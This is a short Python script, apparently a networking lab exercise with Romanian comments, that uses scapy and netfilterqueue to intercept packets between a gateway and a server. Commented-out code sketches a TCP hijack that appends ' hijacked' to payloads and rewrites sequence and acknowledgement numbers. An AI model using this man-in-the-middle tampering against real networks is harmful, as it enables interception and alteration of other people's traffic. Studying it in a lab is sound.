from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os
import time

gateway = '198.10.0.1'
server = '198.10.0.2'
alter = b' hijacked'
ack, seq, payload_len = None, None, None

def alter_packet(packet):
    global gateway, alter, server, ack, seq, payload_len
    ''' alterez continutul pachetelor '''

    # if not packet.haslayer(TCP):
    #     return packet
    #
    # if packet[IP].src == gateway and packet[IP].dst == server and \
    #         'P' in packet[TCP].flags:
    #     ack = packet[TCP].ack
    #     seq = packet[TCP].seq
    #     payload_len = len(packet.load)
    #     print(payload_len)
    #
    #     packet.load += alter
    #     # packet[TCP].seq += len(alter)
    #     # packet[IP].len += len(alter)
    #
    # elif packet[IP].src == server and packet[IP].dst == gateway and \
    #         packet[TCP].flags == 'A' and packet[TCP].seq == ack:
    #     print(seq, packet[TCP].ack)
    #     packet[TCP].ack = seq + payload_len
    #     print(seq, packet[TCP].ack)
    #
    # for i, option in enumerate(packet[TCP].options):
    #    if str(option[0]) == "Timestamp":
    #        del packet[TCP].options[i]
    #         # packet[TCP].options[i] = option[0], \
    #         #     (option[1][0] + 27, option[1][1] + 27)
    #
    # del packet[IP].len
    # del packet[IP].chksum
    # del packet[TCP].chksum
    # packet = IP(packet.build())

    return packet


def proceseaza(packet):
    octeti = packet.get_payload()
    scapy_packet = IP(octeti)
    scapy_packet = alter_packet(scapy_packet)
    scapy_packet.show()
    packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = NFQ()
try:
    queue.bind(27, proceseaza)
    queue.run()
except KeyboardInterrupt:
    queue.unbind()
